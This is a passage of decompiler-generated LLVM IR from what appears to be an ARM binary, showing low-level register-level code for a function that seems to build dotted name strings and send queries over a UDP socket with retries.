dec_label_pc_162a0:                               ; preds = %dec_label_pc_16294
  %v2_162a0 = add i32 %v1_16250, %v0_1626062
  store i32 %v2_162a0, i32* @r1, align 4
  %v0_162a4 = load i32, i32* %sb.global-to-local, align 4
  %v2_162a4 = add i32 %v0_162a4, %v0_1627460
  store i32 %v2_162a4, i32* @r0, align 4
  store i32 %v6_1623463, i32* @r2, align 4
  %v0_162b0 = call i32 @function_f350()
  store i32 %v0_162b0, i32* %r0.global-to-local, align 4
  store i32 %v0_162d864, i32* @ip, align 4
  %v0_162b8 = load i32, i32* %sl.global-to-local, align 4
  %v1_162b8 = load i32, i32* @r5, align 4
  %v2_162b8 = add i32 %v1_162b8, %v0_162b8
  %v3_162b8 = inttoptr i32 %v2_162b8 to i8*
  %v4_162b8 = load i8, i8* %v3_162b8, align 1
  br i1 %v2_162d866, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_162a0
  %v1_162c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_162c0 = load i32, i32* @r4, align 4
  %v3_162c0 = add i32 %v2_162c0, %v1_162c0
  store i32 %v3_162c0, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_162a0, %bb45
  %v2_162c4 = icmp eq i8 %v4_162b8, 0
  br i1 %v2_162c4, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_162d0.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_162b8, i32* %r1.global-to-local, align 4
  %v2_162d0 = load i32, i32* %sb.global-to-local, align 4
  %v3_162d0 = load i32, i32* %r6.global-to-local, align 4
  %v4_162d0 = add i32 %v3_162d0, %v2_162d0
  %v5_162d0 = inttoptr i32 %v4_162d0 to i8*
  store i8 %v0_162d0.off0, i8* %v5_162d0, align 1
  %v0_16228.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1622c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1622c.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_16228

dec_label_pc_162d8:                               ; preds = %dec_label_pc_16228.dec_label_pc_16234_crit_edge
  %v0_162e0.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_162d8, label %dec_label_pc_162ec, label %bb49

bb49:                                             ; preds = %dec_label_pc_16234.preheader, %dec_label_pc_162d8
  %v0_162e0.pre69 = phi i32 [ %v0_162e0.pre.pre, %dec_label_pc_162d8 ], [ 0, %dec_label_pc_16234.preheader ]
  %v2_162dc = add i32 %v0_162e0.pre69, 1
  store i32 %v2_162dc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_162ec

dec_label_pc_162ec:                               ; preds = %dec_label_pc_16294, %dec_label_pc_16280, %dec_label_pc_16258, %dec_label_pc_16228, %dec_label_pc_162d8, %dec_label_pc_1622c.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_162dc, %bb49 ], [ -1, %dec_label_pc_1622c.preheader ], [ %v0_162e0.pre.pre, %dec_label_pc_162d8 ], [ -1, %dec_label_pc_16280 ], [ -1, %dec_label_pc_16294 ], [ -1, %dec_label_pc_16228 ], [ -1, %dec_label_pc_16258 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_16200, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_162e0.pre.pre, { 1, 0 }
  uselistorder i32 %v1_162b8, { 1, 0 }
  uselistorder i32 %v5_16270, { 1, 0 }
  uselistorder i32 %v1_16250, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1627460, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1623463, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_162d866, { 1, 2, 0 }
  uselistorder i32 %v0_16204, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_162ec, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_16240, { 1, 0 }
}

define i32 @function_162f8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_162f8:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_162f8 = load i32, i32* @r4, align 4
  %v6_162f8 = load i32, i32* @r5, align 4
  %v9_162f8 = load i32, i32* @r6, align 4
  %v12_162f8 = load i32, i32* @r7, align 4
  %v15_162f8 = load i32, i32* @r8, align 4
  %v18_162f8 = load i32, i32* @sb, align 4
  %v21_162f8 = load i32, i32* @sl, align 4
  %v24_162f8 = load i32, i32* @fp, align 4
  %v27_162f8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_1630c = load i32, i32* %r1.global-to-local, align 4
  %v1_16314 = call i32 @function_fd60(i32 512)
  store i32 %v1_16314, i32* @sl, align 4
  %v0_1631c = load i32, i32* @r4, align 4
  store i32 %v0_1631c, i32* @r0, align 4
  %v0_16320 = call i32 @function_f2e0()
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_1632c = icmp ugt i32 %v0_16320, 893
  store i1 %v3_1632c, i1* %cpsr_c.global-to-local, align 1
  store i32 142044, i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v0_16320, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_1634c

.thread132:                                       ; preds = %dec_label_pc_162f8
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16a5c

dec_label_pc_1634c:                               ; preds = %dec_label_pc_162f8
  %v1_16350 = add i32 %v0_16320, 130
  %v1_16354 = call i32 @function_fd60(i32 %v1_16350)
  store i32 %v1_16354, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16358 = icmp eq i32 %v1_16354, 0
  br i1 %v2_16358, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_1634c
  %v1_1635c = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1635c = icmp eq i32 %v1_1635c, 0
  br i1 %v3_1635c, label %bb213, label %dec_label_pc_16370

.thread5:                                         ; preds = %dec_label_pc_1634c
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_16a54

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_16a54

dec_label_pc_16370:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_16370 = load i32, i32* @r4, align 4
  %v1_16370 = inttoptr i32 %v0_16370 to i8*
  %v2_16370 = load i8, i8* %v1_16370, align 1
  %v3_16370 = zext i8 %v2_16370 to i32
  store i32 %v3_16370, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16374 = icmp eq i8 %v2_16370, 0
  br i1 %v2_16374, label %dec_label_pc_16a54, label %dec_label_pc_1637c

dec_label_pc_1637c:                               ; preds = %dec_label_pc_16370
  %v2_16380 = add i32 %v0_16370, %v0_16320
  store i32 %v2_16380, i32* %r3.global-to-local, align 4
  %v1_16384 = add i32 %v2_16380, -1
  %v2_16384 = inttoptr i32 %v1_16384 to i8*
  %v3_16384 = load i8, i8* %v2_16384, align 1
  %v4_16384 = zext i8 %v3_16384 to i32
  store i32 %v4_16384, i32* @r3, align 4
  store i32 %v0_16320, i32* @r2, align 4
  store i32 %v0_16370, i32* @r1, align 4
  %v0_16394 = call i32 @function_f350()
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 12312, i32* %ip.global-to-local, align 4
  store i32 10756, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_16410 = ptrtoint i32* %stack_var_-76 to i32
  %v2_16528 = ptrtoint i16* %stack_var_-104 to i32
  %v15_1652c = ptrtoint i32* %stack_var_-88 to i32
  %v2_16550 = ptrtoint i32* %stack_var_-192 to i32
  %v2_16570 = bitcast i32* %stack_var_-192 to i8*
  %v2_16624 = ptrtoint i32* %stack_var_-48 to i32
  %v2_16630 = ptrtoint i32* %stack_var_-56 to i32
  %v2_166bc = icmp eq i32 %tmp161, 0
  %v1_166c8 = add i32 %tmp160, -2
  %v2_166cc = icmp ne i32 %v1_166c8, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_167b8 = ptrtoint i32* %stack_var_-448 to i32
  %v2_167bc = ptrtoint i32* %stack_var_-144 to i32
  %v5_16a0056 = icmp sgt i32 %tmp159, 0
  %v2_16928 = icmp ne i32 %v0_1630c, 0
  %v7_16928 = icmp eq i32 %v0_1630c, 1
  %v2_168d0 = icmp eq i32 %tmp144, 0
  %v2_166d8 = icmp ugt i8 %v3_16384, 45
  %v7_166d8 = icmp eq i8 %v3_16384, 46
  %v1_16484 = add i32 %v1_16354, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_16464 = add i32 %v1_16354, %v0_16320
  %v5_16464 = inttoptr i32 %v4_16464 to i8*
  %v1_166c8.cmp = icmp ugt i32 %v1_166c8, 1
  %v2_16700 = icmp eq i32 %tmp160, 0
  %v3_1692c = icmp ugt i32 %v0_1630c, 27
  %v8_1692c = icmp eq i32 %v0_1630c, 28
  br label %dec_label_pc_163f4

dec_label_pc_163f4:                               ; preds = %dec_label_pc_16a3c, %dec_label_pc_1637c
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_1637c ], [ %v1_16a40, %dec_label_pc_16a3c ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_1637c ], [ %v3_16508, %dec_label_pc_16a3c ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_1637c ], [ %stack_var_-468.2, %dec_label_pc_16a3c ]
  %v1_163fc = phi i32 [ -1, %dec_label_pc_1637c ], [ %v3_165dc, %dec_label_pc_16a3c ]
  store i32 %v1_163fc, i32* %r3.global-to-local, align 4
  %v2_163f8 = icmp eq i32 %v1_163fc, -1
  store i1 %v2_163f8, i1* %cpsr_c.global-to-local, align 1
  %v7_163f8 = icmp eq i32 %v1_163fc, -1
  br i1 %v7_163f8, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_163f4
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_163f4, %bb215
  %v1_16400 = xor i1 %v7_163f8, true
  call void @__pseudo_cond_branch(i1 %v1_16400, i32 ptrtoint (i32* @global_var_cda4.656 to i32))
  store i32 36, i32* @r7, align 4
  %v0_1640c = load i32, i32* @r8, align 4
  %v2_1640c = add i32 %v0_1640c, 40
  %v3_1640c = inttoptr i32 %v2_1640c to i32*
  %v4_1640c = load i32, i32* %v3_1640c, align 4
  store i32 %v4_1640c, i32* @r4, align 4
  store i32 %v2_16410, i32* @r5, align 4
  store i32 76, i32* %ip.global-to-local, align 4
  %v2_1641c = add i32 %v0_1640c, 36
  %v3_1641c = inttoptr i32 %v2_1641c to i32*
  %v4_1641c = load i32, i32* %v3_1641c, align 4
  store i32 %v4_1641c, i32* %r1.global-to-local, align 4
  %v2_16424 = add i32 %v0_1640c, 76
  %v3_16424 = inttoptr i32 %v2_16424 to i32*
  %v4_16424 = load i32, i32* %v3_16424, align 4
  store i32 %v4_16424, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16424)
  store i32 16, i32* %r1.global-to-local, align 4
  %v0_16438 = load i32, i32* @r8, align 4
  %v2_16438 = add i32 %v0_16438, 16
  %v3_16438 = inttoptr i32 %v2_16438 to i32*
  %v4_16438 = load i32, i32* %v3_16438, align 4
  store i32 %v4_16438, i32* %ip.global-to-local, align 4
  store i32 91204, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16438)
  %v0_16444 = call i32 @function_16b8c()
  %v0_1644c = load i32, i32* @r8, align 4
  %v2_1644c = add i32 %v0_1644c, 12324
  %v3_1644c = inttoptr i32 %v2_1644c to i32*
  %v4_1644c = load i32, i32* %v3_1644c, align 4
  store i32 %v1_16354, i32* %r3.global-to-local, align 4
  store i32 %v0_16320, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_1645c = load i32, i32* @sb, align 4
  %v3_1645c = icmp uge i32 %v0_1645c, %v4_1644c
  store i1 %v3_1645c, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_16464, align 1
  %v0_16468 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16468, label %dec_label_pc_16494, label %dec_label_pc_1646c

dec_label_pc_1646c:                               ; preds = %bb216
  %v3_16474 = load i32, i32* %ip.global-to-local, align 4
  %v4_16474 = add i32 %v3_16474, %v1_16354
  %v5_16474 = inttoptr i32 %v4_16474 to i8*
  store i8 46, i8* %v5_16474, align 1
  store i32 12312, i32* %r1.global-to-local, align 4
  %v4_16480 = load i32, i32* @global_var_25af4.657, align 4
  store i32 %v4_16480, i32* %r3.global-to-local, align 4
  %v1_16488 = load i32, i32* %ip.global-to-local, align 4
  %v2_16488 = add i32 %v1_16484, %v1_16488
  %v1_1648c = load i32, i32* @sb, align 4
  %v2_1648c = and i32 %v1_1648c, 1073741824
  %v3_1648c = icmp ne i32 %v2_1648c, 0
  store i1 %v3_1648c, i1* %cpsr_c.global-to-local, align 1
  %v4_1648c = mul i32 %v1_1648c, 4
  %v5_1648c = add i32 %v4_1648c, %v4_16480
  %v6_1648c = inttoptr i32 %v5_1648c to i32*
  %v7_1648c = load i32, i32* %v6_1648c, align 4
  store i32 %v7_1648c, i32* @r1, align 4
  %v2_16490 = inttoptr i32 %v2_16488 to i8*
  %v3_16490 = call i32 @function_f53c(i8* %v2_16490, i32 %v7_1648c)
  br label %dec_label_pc_16494

dec_label_pc_16494:                               ; preds = %bb216, %dec_label_pc_1646c
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16498 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_16498, label %dec_label_pc_164a0, label %dec_label_pc_16494.dec_label_pc_164d0_crit_edge

dec_label_pc_16494.dec_label_pc_164d0_crit_edge:  ; preds = %dec_label_pc_16494
  %v0_164d8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_164d0

dec_label_pc_164a0:                               ; preds = %dec_label_pc_16494
  store i32 12320, i32* %r3.global-to-local, align 4
  store i32 935, i32* %ip.global-to-local, align 4
  %v0_164a8 = load i32, i32* @r8, align 4
  %v2_164a8 = add i32 %v0_164a8, 12320
  %v3_164a8 = inttoptr i32 %v2_164a8 to i32*
  %v4_164a8 = load i32, i32* %v3_164a8, align 4
  %v2_164ac = add i32 %v0_164a8, 935
  %v3_164ac = inttoptr i32 %v2_164ac to i8*
  %v4_164ac = load i8, i8* %v3_164ac, align 1
  %v6_164ac = zext i8 %v4_164ac to i32
  %v2_164b0 = mul i32 %v6_164ac, %v4_164a8
  store i32 %v2_164b0, i32* %r3.global-to-local, align 4
  store i32 10756, i32* %r1.global-to-local, align 4
  %v2_164bc = add i32 %v0_164a8, 932
  %v3_164bc = inttoptr i32 %v2_164bc to i16*
  %v4_164bc = load i16, i16* %v3_164bc, align 2
  %v6_164bc = zext i16 %v4_164bc to i32
  %v4_164c0 = load i32, i32* @global_var_254e0.658, align 4
  store i32 %v4_164c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_164d0

dec_label_pc_164d0:                               ; preds = %dec_label_pc_16494.dec_label_pc_164d0_crit_edge, %dec_label_pc_164a0
  %v2_16514 = phi i32 [ %v0_164a8, %dec_label_pc_164a0 ], [ %v0_164d8.pre, %dec_label_pc_16494.dec_label_pc_164d0_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_164bc, %dec_label_pc_164a0 ], [ %stack_var_-464.0, %dec_label_pc_16494.dec_label_pc_164d0_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_164c0, %dec_label_pc_164a0 ], [ %stack_var_-468.0, %dec_label_pc_16494.dec_label_pc_164d0_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_164b0, %dec_label_pc_164a0 ], [ %stack_var_-476.0, %dec_label_pc_16494.dec_label_pc_164d0_crit_edge ]
  store i32 12320, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_164d8 = add i32 %v2_16514, 12320
  %v3_164d8 = inttoptr i32 %v2_164d8 to i32*
  %v4_164d8 = load i32, i32* %v3_164d8, align 4
  %v3_164e0 = icmp uge i32 %stack_var_-468.1, %v4_164d8
  store i1 %v3_164e0, i1* %cpsr_c.global-to-local, align 1
  %v4_164e4 = load i32, i32* @global_var_25af8.661, align 4
  store i32 %v4_164e4, i32* %r3.global-to-local, align 4
  br i1 %v3_164e0, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_164d0
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_164d0, %bb217
  %v0_164f0 = phi i32 [ %stack_var_-468.1, %dec_label_pc_164d0 ], [ 0, %bb217 ]
  %v3_164f0 = mul i32 %v0_164f0, 28
  %v4_164f0 = add i32 %v3_164f0, %v4_164e4
  store i32 %v4_164f0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_164fc = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_16508 = urem i32 %v1_164fc, 65536
  store i32 10756, i32* %r1.global-to-local, align 4
  %v1_16514 = trunc i32 %v1_164fc to i16
  %v4_16514 = add i32 %v2_16514, 932
  %v5_16514 = inttoptr i32 %v4_16514 to i16*
  store i16 %v1_16514, i16* %v5_16514, align 2
  store i32 %v0_164f0, i32* @global_var_254e0.658, align 4
  %v0_16520 = load i32, i32* %r3.global-to-local, align 4
  %v1_16524 = inttoptr i32 %v0_16520 to i32*
  %v2_16524 = load i32, i32* %v1_16524, align 4
  %v3_16524 = add i32 %v0_16520, 4
  %v4_16524 = inttoptr i32 %v3_16524 to i32*
  %v5_16524 = load i32, i32* %v4_16524, align 4
  store i32 %v5_16524, i32* %r1.global-to-local, align 4
  %v9_16524 = add i32 %v0_16520, 12
  %v10_16524 = inttoptr i32 %v9_16524 to i32*
  %v11_16524 = load i32, i32* %v10_16524, align 4
  store i32 %v11_16524, i32* %r3.global-to-local, align 4
  %v12_16524 = add i32 %v0_16520, 16
  %v4_1652c = trunc i32 %v2_16524 to i16
  store i16 %v4_1652c, i16* %stack_var_-104, align 2
  store i32 %v15_1652c, i32* %ip.global-to-local, align 4
  %v1_16530 = inttoptr i32 %v12_16524 to i32*
  %v2_16530 = load i32, i32* %v1_16530, align 4
  %v3_16530 = add i32 %v0_16520, 20
  %v4_16530 = inttoptr i32 %v3_16530 to i32*
  %v5_16530 = load i32, i32* %v4_16530, align 4
  store i32 %v5_16530, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 %v2_16530, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_16544 = load i32, i32* @r8, align 4
  %v2_16544 = add i32 %v0_16544, 24
  %v3_16544 = inttoptr i32 %v2_16544 to i32*
  %v4_16544 = load i32, i32* %v3_16544, align 4
  store i32 %v4_16544, i32* %ip.global-to-local, align 4
  store i32 91472, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16544)
  store i32 %v2_16550, i32* @r6, align 4
  %v0_16554 = load i32, i32* @r7, align 4
  store i32 %v0_16554, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_1655c = load i32, i32* @sl, align 4
  %v2_16560 = inttoptr i32 %v0_1655c to i8*
  %v3_16560 = call i32 @function_f240(i8* %v2_16560, i32 %v0_16554)
  %v0_16564 = load i32, i32* @r7, align 4
  store i32 %v0_16564, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_16570 = call i32 @function_f240(i8* %v2_16570, i32 %v0_16564)
  store i32 %v3_16508, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_16580 = load i32, i32* @sl, align 4
  store i32 %v0_16580, i32* %r1.global-to-local, align 4
  store i32 %v3_16508, i32* %stack_var_-192, align 4
  %v6_16594 = call i32 @function_175b0(i32* nonnull %stack_var_-192, i32 %v0_16580, i32 512, i32 %v3_16508, i32 %v3_16508)
  store i32 %v6_16594, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16598 = icmp slt i32 %v6_16594, 0
  br i1 %v1_16598, label %dec_label_pc_16a54, label %dec_label_pc_165a0

dec_label_pc_165a0:                               ; preds = %bb218
  store i32 %v0_1630c, i32* @ip, align 4
  store i32 %v1_16354, i32* @r5, align 4
  %v0_165b0 = load i32, i32* @sl, align 4
  %v2_165b0 = add i32 %v0_165b0, %v6_16594
  store i32 %v2_165b0, i32* %r1.global-to-local, align 4
  %v1_165b4 = sub i32 512, %v6_16594
  store i32 %v1_16354, i32* %stack_var_-60, align 4
  store i32 %v0_1630c, i32* %stack_var_-56, align 4
  %v4_165c0 = call i32 @function_17750(i32* nonnull %stack_var_-60, i32 %v2_165b0, i32 %v1_165b4)
  store i32 %v4_165c0, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_165c4 = icmp slt i32 %v4_165c0, 0
  br i1 %v1_165c4, label %dec_label_pc_16a54, label %dec_label_pc_165cc

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165a0
  %v3_165d0 = load i16, i16* %stack_var_-104, align 2
  %v4_165d0 = sext i16 %v3_165d0 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_165dc = call i32 @function_fc94(i32 %v4_165d0, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_165e0 = icmp slt i32 %v3_165dc, 0
  br i1 %v1_165e0, label %dec_label_pc_16a2c, label %dec_label_pc_165ec

dec_label_pc_165ec:                               ; preds = %dec_label_pc_165cc
  store i32 %v2_16528, i32* %r1.global-to-local, align 4
  %v3_165f4 = call i32 @function_fb6c(i32 %v3_165dc, i32 %v2_16528, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_165f8 = icmp slt i32 %v3_165f4, 0
  br i1 %v1_165f8, label %dec_label_pc_16a2c, label %dec_label_pc_16600

dec_label_pc_16600:                               ; preds = %dec_label_pc_165ec
  %v0_16600 = load i32, i32* @r5, align 4
  %v1_16600 = load i32, i32* @r4, align 4
  %v2_16600 = add i32 %v1_16600, %v0_16600
  %v0_16604 = load i32, i32* @r7, align 4
  store i32 %v0_16604, i32* %r3.global-to-local, align 4
  %v0_1660c = load i32, i32* @sl, align 4
  store i32 %v0_1660c, i32* %r1.global-to-local, align 4
  %v4_16610 = call i32 @function_173c4(i32 %v3_165dc, i32 %v0_1660c, i32 %v2_16600, i32 %v0_16604)
  store i32 934, i32* %r3.global-to-local, align 4
  %v0_16618 = load i32, i32* @r8, align 4
  %v2_16618 = add i32 %v0_16618, 934
  %v3_16618 = inttoptr i32 %v2_16618 to i8*
  %v4_16618 = load i8, i8* %v3_16618, align 1
  %v6_16618 = zext i8 %v4_16618 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_16620 = mul nuw nsw i32 %v6_16618, 1000
  store i32 %v2_16620, i32* @r4, align 4
  store i32 %v2_16624, i32* @r5, align 4
  br label %dec_label_pc_16628

dec_label_pc_16628:                               ; preds = %thread-pre-split, %dec_label_pc_16600
  %v0_16634 = phi i32 [ %v1_16674, %thread-pre-split ], [ %v2_16620, %dec_label_pc_16600 ]
  store i32 %v3_165dc, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_16630, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_165dc, i32* %stack_var_-48, align 4
  %v7_16648 = call i32 @function_173fc(i32 %v2_16624, i32 1, i32 %v0_16634, i32 %v3_165dc, i32 %v3_165dc, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_16650 = load i32, i32* @sl, align 4
  store i32 %v0_16650, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_16648, 1
  br i1 %tmp219, label %dec_label_pc_16a2c, label %dec_label_pc_16664

dec_label_pc_16664:                               ; preds = %dec_label_pc_16628
  %v4_16664 = call i32 @function_fbd8(i32 %v3_165dc, i32 %v0_16650, i32 512, i32 64)
  %v2_16668 = icmp ugt i32 %v4_16664, 10
  store i1 %v2_16668, i1* %cpsr_c.global-to-local, align 1
  %v8_16670 = icmp sgt i32 %v4_16664, 11
  br i1 %v8_16670, label %dec_label_pc_1669c, label %dec_label_pc_16674

dec_label_pc_16674:                               ; preds = %dec_label_pc_1669c, %dec_label_pc_166b8, %dec_label_pc_16664
  %v0_16674 = load i32, i32* @r4, align 4
  %v1_16674 = add i32 %v0_16674, -1000
  store i32 %v1_16674, i32* @r4, align 4
  %v7_16674 = icmp eq i32 %v0_16674, 1000
  %tmp283 = zext i1 %v7_16674 to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16684 = icmp slt i32 %v4_16664, 0
  br i1 %v1_16684, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_16674
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_16a2c

thread-pre-split:                                 ; preds = %dec_label_pc_16674
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_16674, label %dec_label_pc_16a2c, label %dec_label_pc_16628

dec_label_pc_1669c:                               ; preds = %dec_label_pc_16664
  store i32 %v2_16550, i32* %r1.global-to-local, align 4
  %v0_166a0 = load i32, i32* @sl, align 4
  %v2_166a4 = inttoptr i32 %v0_166a0 to i8*
  %v3_166a4 = call i32 @function_1769c(i8* %v2_166a4, i32 %v2_16550)
  %v3_166a8 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_166a8, i32* %r3.global-to-local, align 4
  store i32 %v3_16508, i32* %r1.global-to-local, align 4
  %v3_166b0 = icmp uge i32 %v3_166a8, %v3_16508
  store i1 %v3_166b0, i1* %cpsr_c.global-to-local, align 1
  %v9_166b0 = icmp eq i32 %v3_166a8, %v3_16508
  br i1 %v9_166b0, label %dec_label_pc_166b8, label %dec_label_pc_16674

dec_label_pc_166b8:                               ; preds = %dec_label_pc_1669c
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_166bc, label %dec_label_pc_16674, label %dec_label_pc_166c4

dec_label_pc_166c4:                               ; preds = %dec_label_pc_166b8
  store i32 %v1_166c8, i32* %r3.global-to-local, align 4
  store i1 %v2_166cc, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_166c8.cmp, label %dec_label_pc_16700, label %dec_label_pc_166d4

dec_label_pc_166d4:                               ; preds = %dec_label_pc_166c4
  store i1 %v2_166d8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_166d8, label %dec_label_pc_166f4, label %dec_label_pc_166e0

dec_label_pc_166e0:                               ; preds = %dec_label_pc_166d4
  store i32 %v4_1644c, i32* @r5, align 4
  %v1_166e4 = add i32 %v4_1644c, -1
  store i32 %v1_166e4, i32* %r3.global-to-local, align 4
  %v0_166e8 = load i32, i32* @sb, align 4
  %v3_166e8 = icmp uge i32 %v0_166e8, %v1_166e4
  store i1 %v3_166e8, i1* %cpsr_c.global-to-local, align 1
  %v5_166ec = icmp slt i32 %v0_166e8, %v1_166e4
  br i1 %v5_166ec, label %.thread7, label %dec_label_pc_166f4

.thread7:                                         ; preds = %dec_label_pc_166e0
  %v7_166ec = add i32 %v0_166e8, 1
  br label %dec_label_pc_16a3c

dec_label_pc_166f4:                               ; preds = %dec_label_pc_166e0, %dec_label_pc_166d4
  %v0_166f4 = call i32 @function_12ba4()
  br label %dec_label_pc_16728

dec_label_pc_16700:                               ; preds = %dec_label_pc_166c4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
